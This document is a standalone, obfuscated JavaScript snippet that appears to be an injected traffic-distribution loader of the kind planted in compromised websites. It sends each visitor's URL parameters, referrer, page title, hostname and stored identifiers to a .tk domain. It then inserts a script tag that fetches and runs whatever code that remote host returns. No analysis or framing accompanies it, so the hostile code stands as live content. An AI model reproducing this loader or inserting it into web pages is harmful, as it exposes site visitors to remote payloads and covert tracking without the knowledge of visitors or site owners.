   (function() {
    var name = '_Wnhynzt5VfK9fSK6';
    if (!window._Wnhynzt5VfK9fSK6) {
        window._Wnhynzt5VfK9fSK6 = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://paygambfasliling.tk/jog-fit',
            P_PATH: 'https://paygambfasliling.tk/fec84ce/postback',
        };
    }
    const _1ZSnHHkvysBrD4V1 = localStorage.getItem('config');
    if (typeof _1ZSnHHkvysBrD4V1 !== 'undefined' && _1ZSnHHkvysBrD4V1 !== null) {
        var _tpJYwwV9TLCYDS3Y = JSON.parse(_1ZSnHHkvysBrD4V1);
        var _4zQG8rVMhNLgf6hf = Math.round(+new Date()/1000);
        if (_tpJYwwV9TLCYDS3Y.created_at + window._Wnhynzt5VfK9fSK6.ttl < _4zQG8rVMhNLgf6hf) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _3JWDqQKXw1fxkDMT = localStorage.getItem('subId');
    var _chc9zPPtSV2p4rnk = localStorage.getItem('token');
    var _v12vMYmW6FqbyBgt = '?return=js.client';
        _v12vMYmW6FqbyBgt += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _v12vMYmW6FqbyBgt += '&se_referrer=' + encodeURIComponent(document.referrer);
        _v12vMYmW6FqbyBgt += '&default_keyword=' + encodeURIComponent(document.title);
        _v12vMYmW6FqbyBgt += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _v12vMYmW6FqbyBgt += '&name=' + encodeURIComponent(name);
        _v12vMYmW6FqbyBgt += '&host=' + encodeURIComponent(window._Wnhynzt5VfK9fSK6.R_PATH);
    if (typeof _3JWDqQKXw1fxkDMT !== 'undefined' && _3JWDqQKXw1fxkDMT && window._Wnhynzt5VfK9fSK6.unique) {
        _v12vMYmW6FqbyBgt += '&sub_id=' + encodeURIComponent(_3JWDqQKXw1fxkDMT);
    }
    if (typeof _chc9zPPtSV2p4rnk !== 'undefined' && _chc9zPPtSV2p4rnk && window._Wnhynzt5VfK9fSK6.unique) {
        _v12vMYmW6FqbyBgt += '&token=' + encodeURIComponent(_chc9zPPtSV2p4rnk);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._Wnhynzt5VfK9fSK6.R_PATH + _v12vMYmW6FqbyBgt;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
